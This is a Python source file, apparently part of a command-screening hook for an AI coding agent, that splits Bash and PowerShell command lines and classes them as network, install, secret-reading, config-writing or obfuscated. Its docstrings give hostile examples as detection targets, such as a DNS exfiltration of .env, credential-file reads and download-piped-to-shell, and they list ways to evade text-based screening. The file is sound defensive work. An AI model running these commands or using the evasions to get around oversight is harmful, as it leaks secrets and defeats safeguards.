"""Shell commands: what a Bash or PowerShell command line runs, sorted into broad classes.

The Claude Code hook sees a Bash (or PowerShell) call as one text. This
module reads that text roughly the way the shell would: it splits it into
simple commands (at ;, &&, ||, |, &, newlines, and the commands inside
$( ), backticks, <( ) and >( )), finds each one's program and words, and
says which of these classes the command line falls into:

    network       talks to another machine: curl, wget, nc, ssh, scp, rsync, ping, nslookup,
                  dig, Invoke-WebRequest, certutil -urlcache, git push/clone/fetch/pull, npm
                  publish, gh, a Bash /dev/tcp or /dev/udp redirection ...
    install       installs or runs code from a registry or the web: npm/pnpm/yarn install or
                  add, pip install, uv pip install, npx, uvx, pipx run, deno run <url>, a
                  download piped to a shell, iex
    secret_read   names a credential file or an agent's configuration (cat .env, cat
                  ~/.aws/credentials), or prints the environment (env, printenv, set, Get-ChildItem env:)
    config_write  writes to such a file: a redirect (>, >> or <>), tee, cp, mv, Set-Content,
                  Out-File, [IO.File]::WriteAllText ... with an agent's configuration, a
                  credential file or the PowerShell profile ($PROFILE) as a target; or
                  a command line that changes into such a folder (cd .claude) and runs
                  anything that may write
    obfuscation   hides what runs: base64 -d piped to a shell, powershell -EncodedCommand,
                  eval, iex, bash -c with a $( ) in its command, text piped into a shell
                  or an interpreter that runs it (echo 'curl x' | bash), a command's
                  output run as a script (bash <(...))
    encoded_host  a host name that carries data: a label of 32 or more characters, one that
                  looks like hex or base32, or one built from a command's output
                  (ping $(cat .env | base64).x.example)

PowerShell reads the typographic quotes (‘ ’ ‚ ‛ “ ” „) as quotes and the en
dash, em dash and horizontal bar as "-"; so does this reader.

A command that cannot be read with certainty is "unreadable": an unclosed
quote or $( ), a heredoc or here-string, ANSI-C quoting ($'...'), a program
chosen at run time ($c args, PowerShell's & $c, & (...) and . (...)), a program
name with a wildcard or a brace expansion (/???/cur?, {curl,x}), a shell's -c
that cannot be placed (bash -o -c x), more than MAX_SEGMENTS commands, more than
MAX_COMMAND_CHARS characters, deeper nesting than MAX_DEPTH, or a control
character. The policy decides what happens to it (see CommandRule).

This raises the bar; it is not a boundary. A shell can reach the same ends in
ways no text reading follows: variables and aliases set earlier (c=curl in an
earlier call), functions, scripts, python -c, node -e, Invoke-Expression of a
string built at run time, globs in arguments (cat .e*), and programs this list
does not name. Nothing here runs anything or touches the file system or the network.
"""

from __future__ import annotations

import functools
import posixpath
import re
from dataclasses import dataclass
from typing import Any, Iterable, Iterator

from .templates import AGENT_CONFIG_PATTERN, AGENT_SENTINEL_HOME_PATTERN, CREDENTIAL_PATTERN, ROUNDABOUT_PATH_PATTERN
from .textutil import printable

NETWORK = "network"
INSTALL = "install"
SECRET_READ = "secret_read"
CONFIG_WRITE = "config_write"
OBFUSCATION = "obfuscation"
ENCODED_HOST = "encoded_host"
CLASSES = (NETWORK, INSTALL, SECRET_READ, CONFIG_WRITE, OBFUSCATION, ENCODED_HOST)
# What each class means, for the operator (validate, explain).
CLASS_TEXT = {
    NETWORK: "talks to another machine",
    INSTALL: "installs or runs code from a package registry or the web",
    SECRET_READ: "reads a credential file or an agent's configuration, or prints the environment",
    CONFIG_WRITE: "writes to an agent's configuration or a credential file",
    OBFUSCATION: "hides what it runs (decoded, evaluated or piped-in text)",
    ENCODED_HOST: "names a host that looks like it carries data",
}
# allow_programs can lift these classes for one program; the others are about words, not programs.
PROGRAM_CLASSES = (NETWORK, INSTALL)
SHELLS = ("bash", "powershell")
UNREADABLE = "unreadable"

MAX_COMMAND_CHARS = 8 * 1024
MAX_SEGMENTS = 64
MAX_DEPTH = 6  # $( ) inside $( ), bash -c inside bash -c, ...
_MAX_WRAPPERS = 8  # sudo nohup env ... before the program
_READINGS_KEPT = 64  # read_command's cache

# Stands for the output of a command substitution inside a word. A control
# character, so it cannot come from the command itself (those are refused).
_SUBST = "\x00"
# Stands for a PowerShell ( ) group in an argument ("Set-Content ('x') y"), as a word of its own.
_GROUP = "\x01"
# PowerShell's tokenizer reads ‘ ’ ‚ ‛ as ', “ ” „ as ", and the en dash, em dash and horizontal bar as -
# (in parameters and operators, and powershell.exe in its own options): & ‘curl.exe’ x runs curl.
_POWERSHELL_PLAIN = str.maketrans({"\u2018": "'", "\u2019": "'", "\u201a": "'", "\u201b": "'", "\u201c": '"',
                                   "\u201d": '"', "\u201e": '"', "\u2013": "-", "\u2014": "-", "\u2015": "-"})
# The dashes powershell.exe and pwsh accept before their own options (–Command, —EncodedCommand).
_DASHES = "-\u2013\u2014\u2015"


class Unreadable(Exception):
    """A command that cannot be read with certainty. The message says why, for the operator."""


@dataclass(frozen=True)
class Finding:
    """One class found in a command line, and where."""

    kind: str  # one of CLASSES
    program: str  # the program of the simple command it was found in ("" when none)
    words: tuple[str, ...]  # that command's first words, lowercased, for allow_programs
    evidence: str  # what was seen, made printable: "program 'curl'", "word '.env'"


@dataclass(frozen=True)
class Reading:
    """What a command line does: the classes found, or why it could not be read."""

    findings: tuple[Finding, ...] = ()
    unreadable: str | None = None

    def kinds(self) -> frozenset[str]:
        return frozenset(finding.kind for finding in self.findings)


def read_command(text: str, shell: str = "bash") -> Reading:
    """Read one command line (see the module docstring). Never raises for any text."""
    if not isinstance(text, str):
        return Reading(unreadable="the command is not text")
    if shell not in SHELLS:
        raise ValueError(f"unknown shell {shell!r}")
    if len(text) > MAX_COMMAND_CHARS:
        return Reading(unreadable=f"it is longer than {MAX_COMMAND_CHARS} characters")
    return _cached_reading(text, shell)


@functools.lru_cache(maxsize=_READINGS_KEPT)
def _cached_reading(text: str, shell: str) -> Reading:
    # The same command is read for the verdict, for the flow labels and for the marks: once is enough.
    if any(ch < " " and ch not in "\t\r\n" or ch == "\x7f" for ch in text):
        return Reading(unreadable="it holds a control character")
    try:
        commands = _read(text, shell, _Budget(), 0)
        return Reading(tuple(_findings(commands)))
    except Unreadable as exc:
        return Reading(unreadable=str(exc))
    except Exception as exc:  # a tokenizer error, or a spelling this reader gets wrong: not read, so not trusted
        return Reading(unreadable=f"the command could not be split into words ({type(exc).__name__})")


# ---- splitting a command line --------------------------------------------------------------

class _Budget:
    """The simple commands found so far in one command line, nested ones included, against MAX_SEGMENTS."""

    def __init__(self) -> None:
        self.segments = 0
        self.pipelines = 0  # pipelines numbered so far: each gets its own number, nested ones too

    def spend(self) -> None:
        self.segments += 1
        if self.segments > MAX_SEGMENTS:
            raise Unreadable(f"it holds more than {MAX_SEGMENTS} commands")

    def next_pipeline(self) -> int:
        self.pipelines += 1
        return self.pipelines


@dataclass(frozen=True)
class _Command:
    """One simple command: its program, its words and where its output is written."""

    program: str  # basename, lowercased, without .exe/.cmd/.bat/.ps1; "" for none
    words: tuple[str, ...]  # the words after the program, quotes removed
    targets: tuple[str, ...]  # targets of > and >> (and of PowerShell's redirections)
    shell: str
    pipeline: int  # commands of one pipeline share this number
    position: int  # place in the pipeline: 0 is the first
    written: str = ""  # the program's word as written
    groups: tuple[str, ...] = ()  # PowerShell: the words of its ( ), $( ) and @( ) arguments
    chdir: tuple[str, ...] = ()  # folders it runs in: env -C x, sudo -D x, wsl --cd x, git -C x, make -C x
    fed: str | None = None  # run by xargs or parallel: the text they replace with each input ("" = added at the end)
    relined: bool = False  # run by wsl, whose Linux shell reads the program and its words again as a command line


# A segment of a pipeline: a simple command's text (quotes kept), and the texts of its PowerShell groups.
_Segment = tuple[str, tuple[str, ...]]


def _read(text: str, shell: str, budget: _Budget, depth: int) -> list[_Command]:
    """Every simple command of `text`, nested ones included (and the ones bash -c and the like run)."""
    if depth > MAX_DEPTH:
        raise Unreadable("it nests commands more deeply than is followed")
    if shell == "powershell":
        text = text.translate(_POWERSHELL_PLAIN)
    splitter = _BashSplitter if shell == "bash" else _PowerShellSplitter
    pipelines = splitter(text, budget, depth).split()
    commands: list[_Command] = []
    for pipeline in pipelines:
        number = budget.next_pipeline()
        for position, (segment, groups) in enumerate(pipeline):
            words, targets = _bash_words(segment) if shell == "bash" else _powershell_words(segment)
            for command in _simple_commands(words, targets, shell, number, position, _group_words(groups)):
                commands.append(command)
                commands.extend(_inner_commands(command, budget, depth))
    return commands


def _group_words(groups: tuple[str, ...]) -> tuple[str, ...]:
    """The words inside a command's PowerShell groups, split at commas and brackets too ('a','b' is a list)."""
    found: list[str] = []
    for body in groups:
        words, targets = _powershell_words(body)
        for word in (*words, *targets):
            found.extend(part for part in re.split(r"[(),]+", word) if part)
    return tuple(found)


class _Splitter:
    """What the Bash and PowerShell splitters share: the pipelines being built, and nested commands."""

    def __init__(self, text: str, budget: _Budget, depth: int) -> None:
        self.text = text
        self.budget = budget
        self.depth = depth
        self.pipelines: list[list[_Segment]] = []
        self.pipeline: list[_Segment] = []
        self.current: list[str] = []
        self.groups: list[str] = []  # the current command's PowerShell group texts
        self.last = ""  # the last character of the current command that is not a space ("" for none yet)
        self.open = 0  # "(" (and in PowerShell "{") not yet closed

    def push(self, piece: str) -> None:
        """Add text to the current command (keeping `last` up to date, so no check has to join it all)."""
        self.current.append(piece)
        visible = piece.rstrip()
        if visible:
            self.last = visible[-1]

    def end_command(self) -> None:
        segment = "".join(self.current).strip()
        self.current.clear()
        self.last = ""
        groups = tuple(self.groups)
        self.groups.clear()
        if segment:
            self.budget.spend()
            self.pipeline.append((segment, groups))

    def end_pipeline(self) -> None:
        self.end_command()
        if self.pipeline:
            self.pipelines.append(self.pipeline)
            self.pipeline = []

    def at_word_start(self) -> bool:
        return not self.current or self.current[-1][-1:].isspace()

    def ends_with_redirection(self) -> bool:
        """True if the current command's text ends with ">" (so a "&" next is part of >& or 2>&1)."""
        return bool(self.current) and self.current[-1].endswith(">")

    def nested(self, body: str, shell: str) -> None:
        """A command inside this one ($( ), backticks ...): its pipelines are read as pipelines of their own."""
        self.pipelines.extend(_nested_splitter(shell)(body, self.budget, self.depth + 1).split())
        self.push(_SUBST)

    def opened(self) -> None:
        self.open += 1
        self.end_pipeline()

    def closed(self) -> None:
        self.open -= 1
        if self.open < 0:
            raise Unreadable("a closing bracket has no opening one")
        self.end_pipeline()

    def finish(self) -> list[list[_Segment]]:
        if self.open:
            raise Unreadable("a bracket is not closed")
        self.end_pipeline()
        return self.pipelines


def _nested_splitter(shell: str) -> type:
    if shell == "bash":
        return _BashSplitter
    return _PowerShellSplitter


class _BashSplitter(_Splitter):
    """Split a Bash command line into pipelines of simple commands (each still a text, quotes kept)."""

    def __init__(self, text: str, budget: _Budget, depth: int) -> None:
        if depth > MAX_DEPTH:
            raise Unreadable("it nests commands more deeply than is followed")
        super().__init__(text, budget, depth)

    def split(self) -> list[list[_Segment]]:
        text, i, n = self.text, 0, len(self.text)
        while i < n:
            c = text[i]
            nxt = text[i + 1:i + 2]
            if c == "\\":
                if not nxt:
                    raise Unreadable("it ends with a backslash")
                if nxt != "\n":  # a backslash before a newline joins the lines
                    self.push(text[i:i + 2])
                i += 2
            elif c == "'":
                end = text.find("'", i + 1)
                if end < 0:
                    raise Unreadable("a quote is not closed")
                self.push(text[i:end + 1])
                i = end + 1
            elif c == '"':
                i = self.double_quoted(i)
            elif c == "$" and nxt == "(":
                body, i = _bash_closing_paren(text, i + 2, self.depth)
                self.nested(body, "bash")
            elif c == "$" and nxt == "'":
                raise Unreadable("ANSI-C quoting ($'...') can spell any program or file name")
            elif c == "$" and nxt == "{":
                i = self.parameter(i)
            elif c == "`":
                body, i = _bash_backticks(text, i + 1)
                self.nested(body, "bash")
            elif c in "<>" and nxt == "(":
                body, i = _bash_closing_paren(text, i + 2, self.depth)
                self.nested(body, "bash")
            elif c == "<" and nxt == "<":
                raise Unreadable("a heredoc or here-string (<<) holds text that is not read")
            elif c == "#" and self.at_word_start():
                end = text.find("\n", i)
                i = n if end < 0 else end
            elif c in ";\n":
                self.end_pipeline()
                i += 1
            elif c == "|":
                if nxt == "|":
                    self.end_pipeline()
                    i += 2
                else:
                    self.end_command()
                    i += 2 if nxt == "&" else 1
            elif c == "&":
                if nxt == "&":
                    self.end_pipeline()
                    i += 2
                elif nxt == ">" or self.ends_with_redirection():
                    self.push(c)  # &> and >& are redirections
                    i += 1
                else:
                    self.end_pipeline()  # a command run in the background
                    i += 1
            elif c == "(":
                self.opened()
                i += 1
            elif c == ")":
                self.closed()
                i += 1
            else:
                self.push(c)
                i += 1
        return self.finish()

    def double_quoted(self, start: int) -> int:
        """Copy a "..." text, reading the $( ) and backticks inside it as commands. The index after it."""
        text, i, n = self.text, start + 1, len(self.text)
        parts = ['"']
        while i < n:
            c = text[i]
            if c == "\\" and i + 1 < n:
                parts.append(text[i:i + 2])
                i += 2
            elif c == '"':
                parts.append('"')
                self.push("".join(parts))
                return i + 1
            elif c == "$" and text[i + 1:i + 2] == "(":
                body, i = _bash_closing_paren(text, i + 2, self.depth)
                self.nested(body, "bash")
                parts.append(self.current.pop())
            elif c == "`":
                body, i = _bash_backticks(text, i + 1)
                self.nested(body, "bash")
                parts.append(self.current.pop())
            else:
                parts.append(c)
                i += 1
        raise Unreadable("a quote is not closed")

    def parameter(self, start: int) -> int:
        """Copy a ${...}, reading any $( ) inside it ("${x:-$(curl ...)}") as a command."""
        text, i, n = self.text, start + 2, len(self.text)
        parts = ["${"]
        open_braces = 1
        while i < n:
            c = text[i]
            if c == "\\" and i + 1 < n:
                parts.append(text[i:i + 2])
                i += 2
                continue
            if c == "$" and text[i + 1:i + 2] == "(":
                body, i = _bash_closing_paren(text, i + 2, self.depth)
                self.nested(body, "bash")
                parts.append(self.current.pop())
                continue
            if c == "`":
                body, i = _bash_backticks(text, i + 1)
                self.nested(body, "bash")
                parts.append(self.current.pop())
                continue
            if c == "{":
                open_braces += 1
            elif c == "}":
                open_braces -= 1
                if open_braces == 0:
                    parts.append("}")
                    self.push("".join(parts))
                    return i + 1
            parts.append(c)
            i += 1
        raise Unreadable("a '${' is not closed")


def _bash_closing_paren(text: str, start: int, depth: int) -> tuple[str, int]:
    """The body of a $( ) (or <( ), >( )) that starts at `start`, and the index after its ")"."""
    if depth > MAX_DEPTH:
        raise Unreadable("it nests commands more deeply than is followed")
    i, n, open_parens = start, len(text), 1
    while i < n:
        c = text[i]
        if c == "\\":
            i += 2
        elif c == "'":
            end = text.find("'", i + 1)
            if end < 0:
                raise Unreadable("a quote is not closed")
            i = end + 1
        elif c == '"':
            i = _bash_skip_double_quoted(text, i + 1, depth + 1)
        elif c == "`":
            i = _bash_backticks(text, i + 1)[1]
        else:
            if c == "(":
                open_parens += 1
            elif c == ")":
                open_parens -= 1
                if open_parens == 0:
                    return text[start:i], i + 1
            i += 1
    raise Unreadable("a '$(' is not closed")


def _bash_skip_double_quoted(text: str, start: int, depth: int) -> int:
    """The index after the "..." whose text starts at `start` (its own $( ) skipped whole)."""
    i, n = start, len(text)
    while i < n:
        c = text[i]
        if c == "\\":
            i += 2
        elif c == '"':
            return i + 1
        elif c == "$" and text[i + 1:i + 2] == "(":
            i = _bash_closing_paren(text, i + 2, depth + 1)[1]
        elif c == "`":
            i = _bash_backticks(text, i + 1)[1]
        else:
            i += 1
    raise Unreadable("a quote is not closed")


def _bash_backticks(text: str, start: int) -> tuple[str, int]:
    """The body of a `...` that starts at `start`, and the index after the closing backtick."""
    i, n = start, len(text)
    while i < n:
        if text[i] == "\\":
            i += 2
        elif text[i] == "`":
            return text[start:i], i + 1
        else:
            i += 1
    raise Unreadable("a backtick is not closed")


class _PowerShellSplitter(_Splitter):
    """Split a PowerShell command line into pipelines of simple commands.

    $( ), @( ), ( ) and { } blocks are read as commands of their own; so are
    script blocks ({ ... } after ForEach-Object, Invoke-Command ...). A ( ),
    $( ) or @( ) in an argument ("Set-Content ('.claude\\settings.json') x")
    is also kept with the command it is in: its words are the command's
    `groups`, and a ( ) leaves the word _GROUP in its place. The program
    after the call operator & or a dot-source . must be a name: "& (gcm iwr)"
    and ". (gcm iwr)" choose it when the command runs.
    """

    def __init__(self, text: str, budget: _Budget, depth: int) -> None:
        if depth > MAX_DEPTH:
            raise Unreadable("it nests commands more deeply than is followed")
        super().__init__(text, budget, depth)
        self.calling = False  # the last thing seen was the call operator & or a dot-source "."

    def end_command(self) -> None:
        self.calling = False
        super().end_command()

    def at_statement_start(self) -> bool:
        """True where a program name may come: nothing before it yet, or only an assignment ("$x = ")."""
        return self.last in ("", "=")

    def split(self) -> list[list[_Segment]]:
        text, i, n = self.text, 0, len(self.text)
        while i < n:
            c = text[i]
            nxt = text[i + 1:i + 2]
            if self.calling and not c.isspace():
                self.calling = False
                if c == "(":
                    raise Unreadable("the program is chosen when the command runs (& or . before a ( ) group)")
            if c == "`":  # PowerShell's escape character
                if not nxt:
                    raise Unreadable("it ends with a backtick")
                if nxt in "\r\n":  # a line continuation
                    i += 3 if text[i + 1:i + 3] == "\r\n" else 2
                else:
                    self.push(text[i:i + 2])
                    i += 2
            elif c == "'":
                end = _powershell_single_quote_end(text, i)
                self.push(text[i:end])
                i = end
            elif c == '"':
                i = self.double_quoted(i)
            elif c == "@" and nxt in ("'", '"'):
                raise Unreadable("a here-string (@' or @\") holds text that is not read")
            elif c in "$@" and nxt == "(":
                body, i = _powershell_closing(text, i + 2, self.depth)
                self.nested(body, "powershell")
                self.groups.append(body)
            elif c == "<" and nxt == "#":
                end = text.find("#>", i + 2)
                if end < 0:
                    raise Unreadable("a <# comment is not closed")
                i = end + 2
            elif c == "#" and self.at_word_start():
                end = text.find("\n", i)
                i = n if end < 0 else end
            elif c in ";\n":
                self.end_pipeline()
                i += 1
            elif c == "|":
                if nxt == "|":
                    self.end_pipeline()
                    i += 2
                else:
                    self.end_command()
                    i += 1
            elif c == "&":
                if nxt == "&":
                    self.end_pipeline()
                    i += 2
                elif self.ends_with_redirection():
                    self.push(c)  # part of 2>&1
                    i += 1
                elif self.at_statement_start():
                    self.push("& ")  # the call operator, a word of its own even in &"curl" or &iwr
                    self.calling = True
                    i += 1
                else:
                    self.end_pipeline()  # a background job
                    i += 1
            elif c == "." and self.at_statement_start() and nxt[:1].isspace():
                self.push(c)  # dot-sourcing: ". iwr x" runs iwr
                self.calling = True
                i += 1
            elif c == "(" and not self.at_statement_start():
                # A group in an argument: read as commands, and its words kept with this command.
                body, i = _powershell_closing(text, i + 1, self.depth)
                self.pipelines.extend(_PowerShellSplitter(body, self.budget, self.depth + 1).split())
                self.groups.append(body)
                self.push(f" {_GROUP} ")
            elif c in "({":
                self.opened()
                i += 1
            elif c in ")}":
                self.closed()
                i += 1
            else:
                self.push(c)
                i += 1
        return self.finish()

    def double_quoted(self, start: int) -> int:
        text, i, n = self.text, start + 1, len(self.text)
        parts = ['"']
        while i < n:
            c = text[i]
            if c == "`" and i + 1 < n:
                parts.append(text[i:i + 2])
                i += 2
            elif c == '"':
                if text[i + 1:i + 2] == '"':  # "" is a quote inside the text
                    parts.append('""')
                    i += 2
                    continue
                parts.append('"')
                self.push("".join(parts))
                return i + 1
            elif c == "$" and text[i + 1:i + 2] == "(":
                body, i = _powershell_closing(text, i + 2, self.depth)
                self.nested(body, "powershell")
                self.groups.append(body)
                parts.append(self.current.pop())
            else:
                parts.append(c)
                i += 1
        raise Unreadable("a quote is not closed")


def _powershell_single_quote_end(text: str, start: int) -> int:
    """The index after a '...' text that starts at `start` ('' inside it is a quote)."""
    i = start + 1
    while True:
        end = text.find("'", i)
        if end < 0:
            raise Unreadable("a quote is not closed")
        if text[end + 1:end + 2] == "'":
            i = end + 2
            continue
        return end + 1


def _powershell_closing(text: str, start: int, depth: int) -> tuple[str, int]:
    """The body of a PowerShell $( ) or @( ) that starts at `start`, and the index after its ")"."""
    if depth > MAX_DEPTH:
        raise Unreadable("it nests commands more deeply than is followed")
    i, n, open_parens = start, len(text), 1
    while i < n:
        c = text[i]
        if c == "`":
            i += 2
        elif c == "'":
            i = _powershell_single_quote_end(text, i)
        elif c == '"':
            i = _powershell_skip_double_quoted(text, i + 1, depth + 1)
        else:
            if c == "(":
                open_parens += 1
            elif c == ")":
                open_parens -= 1
                if open_parens == 0:
                    return text[start:i], i + 1
            i += 1
    raise Unreadable("a '$(' is not closed")


def _powershell_skip_double_quoted(text: str, start: int, depth: int) -> int:
    i, n = start, len(text)
    while i < n:
        c = text[i]
        if c == "`":
            i += 2
        elif c == '"':
            if text[i + 1:i + 2] == '"':
                i += 2
                continue
            return i + 1
        elif c == "$" and text[i + 1:i + 2] == "(":
            i = _powershell_closing(text, i + 2, depth + 1)[1]
        else:
            i += 1
    raise Unreadable("a quote is not closed")


# ---- words ---------------------------------------------------------------------------------

# A redirection operator on its own (shlex keeps them apart from words): >, >>, &>, >|, 2>, *> ..., and
# <>, which opens its file for reading AND writing (echo x 1<> f overwrites the start of f).
_REDIRECT = re.compile(r"([0-9]*|\*|&)>>?[|&]?|[0-9]*<>")


def _bash_words(segment: str) -> tuple[list[str], list[str]]:
    """The words of one Bash simple command (quotes removed, by shlex), and its output targets."""
    import shlex  # here, not at the top: importing the library must not load it (the hook starts often)

    lexer = shlex.shlex(segment, posix=True, punctuation_chars=True)
    lexer.whitespace_split = True
    lexer.commenters = ""
    try:
        tokens = list(lexer)
    except ValueError as exc:  # "No closing quotation", "No escaped character"
        raise Unreadable(f"it cannot be split into words ({exc})") from None
    return _redirections(tokens, attached=False)


def _redirections(tokens: list[str], attached: bool) -> tuple[list[str], list[str]]:
    """Separate the output targets (the word after > or >>) from the words; drop the operators.

    attached: PowerShell words, where the target may be in the same word (">file", "2>file").
    """
    words: list[str] = []
    targets: list[str] = []
    expect_target = False
    for token in tokens:
        if expect_target:
            expect_target = False
            if not re.fullmatch(r"[0-9-]+", token):  # >&2 and >&- name a stream, not a file
                targets.append(token)
            continue
        operator = _REDIRECT.fullmatch(token)
        if operator or token in ("<", "<&"):
            if words and words[-1].isdigit() and operator:
                words.pop()  # "2" of "2>": shlex splits it off
            expect_target = token not in ("<", "<&")
            continue
        found = re.match(r"(?:[0-9]*|\*)>>?", token) if attached else None
        if found and found.end() < len(token):
            targets.append(token[found.end():])
            continue
        words.append(token)
    return words, targets


def _powershell_words(segment: str) -> tuple[list[str], list[str]]:
    """The words of one PowerShell simple command (quotes and backtick escapes removed), and its targets."""
    words: list[str] = []
    current: list[str] = []
    started = False
    i, n = 0, len(segment)
    while i < n:
        c = segment[i]
        if c.isspace():
            if started:
                words.append("".join(current))
                current, started = [], False
            i += 1
            continue
        started = True
        if c == "`" and i + 1 < n:
            current.append(segment[i + 1])
            i += 2
        elif c == "'":
            end = _powershell_single_quote_end(segment, i)
            current.append(segment[i + 1:end - 1].replace("''", "'"))
            i = end
        elif c == '"':
            i += 1
            while i < n and not (segment[i] == '"' and segment[i + 1:i + 2] != '"'):
                if segment[i] in '`"' and i + 1 < n:
                    current.append(segment[i + 1])
                    i += 2
                else:
                    current.append(segment[i])
                    i += 1
            i += 1
        else:
            current.append(c)
            i += 1
    if started:
        words.append("".join(current))
    return _redirections(words, attached=True)


# ---- simple commands -----------------------------------------------------------------------

# Words that start a Bash compound command or a group, and come before its first program.
# ("time" is a wrapper below, so that its option -p is not taken for the program.)
_KEYWORDS = frozenset({"if", "then", "else", "elif", "fi", "do", "done", "while", "until", "{", "}", "!",
                       "coproc", "[[", "]]", "function"})
# Commands whose words are not a program to run: a loop header lists values.
_HEADERS = frozenset({"for", "select", "case", "in", "esac"})
_ASSIGNMENT = re.compile(r"[A-Za-z_][A-Za-z0-9_]*(\[[^\]]*\])?\+?=")
# Programs that run the program named after them, and their options that take a value.
_WRAPPERS: dict[str, frozenset[str]] = {
    "sudo": frozenset({"-u", "-g", "-C", "-D", "-h", "-p", "-r", "-t", "-U", "--user", "--group", "--chdir"}),
    "doas": frozenset({"-u", "-C"}),
    "nohup": frozenset(),
    "nice": frozenset({"-n", "--adjustment"}),
    "ionice": frozenset({"-c", "-n", "-p"}),
    "time": frozenset({"-f", "-o"}),
    "timeout": frozenset({"-s", "-k", "--signal", "--kill-after"}),
    "exec": frozenset({"-a"}),
    "command": frozenset(),
    "builtin": frozenset(),
    "env": frozenset({"-u", "-C", "--unset", "--chdir"}),
    "xargs": frozenset({"-I", "-n", "-P", "-d", "-E", "-L", "-s", "-a", "--max-args", "--max-procs",
                        "--delimiter", "--arg-file"}),
    "stdbuf": frozenset({"-i", "-o", "-e"}),
    "setsid": frozenset(),
    "unbuffer": frozenset(),
    "strace": frozenset({"-o", "-e", "-p", "-s"}),
    "watch": frozenset({"-n", "-d", "--interval"}),
    "busybox": frozenset(),  # busybox wget ...
    "corepack": frozenset(),  # corepack pnpm add ...
    "chroot": frozenset({"--userspec", "--groups"}),  # then the new root folder
    "flock": frozenset({"-w", "--wait", "--timeout", "-E", "--conflict-exit-code"}),  # then the lock file
    "parallel": frozenset({"-j", "--jobs", "-S", "--sshlogin", "-a", "--arg-file", "--delay", "-n", "-N",
                           "--max-args", "-I", "--timeout", "--joblog", "--results", "-d", "--delimiter", "-E"}),
    "&": frozenset(),  # PowerShell's call operator
    ".": frozenset(),  # PowerShell's dot-sourcing (only there: in Bash "." reads a script file)
    "call": frozenset(),  # cmd
    "start": frozenset({"/d", "/affinity", "/node"}),  # cmd; its options start with "/"
    "runas": frozenset(),  # Windows: runas /user:x "curl ..."
    "start-process": frozenset({"-argumentlist", "-workingdirectory", "-verb", "-windowstyle", "-credential",
                                "-redirectstandardoutput", "-redirectstandardinput", "-redirectstandarderror"}),
    "saps": frozenset({"-argumentlist", "-workingdirectory", "-verb", "-windowstyle"}),
    # Windows launchers: wsl runs a Linux program (through its shell, unless -e), conhost and winpty a console one.
    "wsl": frozenset({"-d", "--distribution", "-u", "--user", "--cd", "--shell-type", "--distribution-id"}),
    "conhost": frozenset({"--width", "--height", "--signal", "--server", "--feature", "--vtmode"}),
    "winpty": frozenset(),
}
# Wrappers followed by one word that is not the program: timeout's duration, chroot's root, flock's lock file.
_WRAPPERS_WITH_A_VALUE = frozenset({"timeout", "chroot", "flock"})
# Wrappers whose options start with "/" (cmd's start, runas).
_SLASH_OPTION_WRAPPERS = frozenset({"start", "runas"})
# The options of a wrapper (or of git and make) that name the folder the program runs in. Case counts
# (git -c is a setting, git -C a folder), except for cmd's and PowerShell's own options.
_CHDIR_OPTIONS = {
    "env": ("-C", "--chdir"), "sudo": ("-D", "--chdir"), "wsl": ("--cd",), "git": ("-C",),
    "make": ("-C", "--directory"), "start": ("/d",), "start-process": ("-workingdirectory",),
    "saps": ("-workingdirectory",),
}
_CASELESS_OPTIONS = frozenset({"start", "start-process", "saps"})
_STRIPPED_EXTENSIONS = (".exe", ".cmd", ".bat", ".ps1")
# What makes Bash expand a program's name into another one: *, ?, {a,b} or {a..b}; and [...], which
# _check_program_word looks for without a pattern (a pattern would scan the rest of the word from every "[").
_BASH_PATTERN = re.compile(r"[*?]|\{[^{}]*(,|\.\.)[^{}]*\}")


def _program_name(word: str) -> str:
    """The program a word names: its last path part, lowercased, without .exe/.cmd/.bat/.ps1."""
    name = _last_part(word).lower()
    for extension in _STRIPPED_EXTENSIONS:
        if name.endswith(extension) and len(name) > len(extension):
            return name[:-len(extension)]
    return name


def _last_part(word: str) -> str:
    return re.split(r"[\\/]", word)[-1]


def _runtime_chosen(word: str) -> bool:
    """True if the word that names the program holds a variable, a command's output or a ( ) group."""
    return _SUBST in word or _GROUP in word or "$" in word or "`" in word


def _check_program_word(word: str, shell: str) -> None:
    """Refuse (Unreadable) a program word whose program is only known when the command runs.

    A word with spaces in it was quoted: a path with spaces ("C:\\Program
    Files\\x\\curl.exe"), or a command text that env -S, watch and the like
    run, which _inner_commands reads as a command line too. Its folders may hold
    a variable ("$DIR/tool"), but not its last part; quoted, it holds no wildcards.
    """
    if any(ch.isspace() for ch in word):
        if _runtime_chosen(_last_part(word)):
            raise Unreadable("the program is chosen when the command runs (a variable or a command's output)")
        return
    if _runtime_chosen(word):
        raise Unreadable("the program is chosen when the command runs (a variable or a command's output)")
    if shell == "powershell":
        wildcard = "*" in word or "?" in word and word != "?"  # "?" alone is Where-Object
    else:
        bracket = word.find("[")
        wildcard = bool(_BASH_PATTERN.search(word)) or bracket >= 0 and word.find("]", bracket + 1) > 0
    if wildcard:
        # /???/cur? and {curl,x} are curl to the shell.
        raise Unreadable("the program's name holds a wildcard or a brace expansion, which the shell expands")


def _simple_commands(words: list[str], targets: list[str], shell: str, pipeline: int,
                     position: int, groups: tuple[str, ...] = ()) -> list[_Command]:
    """The command (or commands) one segment runs: assignments, keywords and wrappers peeled off."""
    rest = list(words)
    if shell == "powershell":
        rest = _powershell_statement(rest)
    while rest and (_ASSIGNMENT.match(rest[0]) and shell == "bash" or rest[0] in _KEYWORDS):
        rest.pop(0)
        if shell == "powershell" and rest and rest[0] == _GROUP:
            rest.pop(0)  # the condition of if ( ... ) or while ( ... ), read as commands of its own

    chdir: list[str] = []
    fed: str | None = None
    relined = False

    def command(program: str, after: list[str], written: str = "") -> _Command:
        return _Command(program, tuple(after), tuple(targets), shell, pipeline, position, written, groups,
                        tuple(chdir), fed, relined)

    if not rest:
        return [command("", [])] if targets or groups else []
    if rest[0] in _HEADERS:
        return [command("", rest[1:])]
    peeled = 0
    while rest:
        word = rest[0]
        if shell == "powershell" and peeled == 0 and (word[:1] in ("$", "[", "@") or word == _GROUP):
            # An expression ($x.Method(), [Type]::Call(), (...).Length), not a program to run.
            return [command("", rest)]
        _check_program_word(word, shell)
        name = _program_name(word)
        if shell == "powershell" and name == "start":
            name = "start-process"  # in PowerShell, start is Start-Process
        if name not in _WRAPPERS or peeled >= _MAX_WRAPPERS or (name == "." and shell != "powershell"):
            break
        found = _after_wrapper(name, rest[1:])
        if found is None:  # "env" alone, "command -v curl": the wrapper is the program
            break
        rest, options = found
        chdir.extend(_chdir_values(name, options))
        if name in ("xargs", "parallel"):
            fed = _placeholder(name, options)
        relined = relined or name == "wsl" and not any(option.lower() in ("-e", "--exec") for option in options)
        peeled += 1
    if not rest:
        return []
    program = _program_name(rest[0])
